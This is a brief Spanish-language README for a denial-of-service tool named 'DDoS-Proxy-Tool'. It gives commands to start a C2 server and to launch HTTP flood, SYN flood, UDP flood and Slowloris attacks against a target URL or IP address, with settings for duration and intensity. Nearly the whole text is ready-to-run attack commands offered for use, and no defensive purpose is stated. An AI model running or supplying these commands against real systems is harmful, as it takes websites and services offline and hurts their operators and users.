## DDoS-Proxy-Tool  

Iniciar Server:
```cd c2```
```python server.py```


# Usar:
```python client.py -t http://objetivo.com -m http_flood -d 300 -i 1000 --monitor```
 
 
# Parámetros: 
     -t: Objetivo (URL o IP:PUERTO)
     -m: Método
         http_flood: Ataque HTTP Flood
         syn_flood: Ataque SYN Flood
         udp_flood: Ataque UDP Flood
         slowloris: Ataque Slowloris
         
     -d: Duración (en segundos)
     -i: Intensidad
     --monitor: Monitorear
     

# Ejemplos:  
# HTTP Flood
```python client.py -t http://ejemplo.com -m http_flood -d 300 -i 1000```

# SYN Flood
```python client.py -t 192.168.1.100:80 -m syn_flood -d 60 -i 5000```

# UDP Flood
```python client.py -t 192.168.1.100:53 -m udp_flood -d 120 -i 2000```

# Slowloris con monitor
```python client.py -t http://ejemplo.com -m slowloris -d 300 -i 500 --monitor```
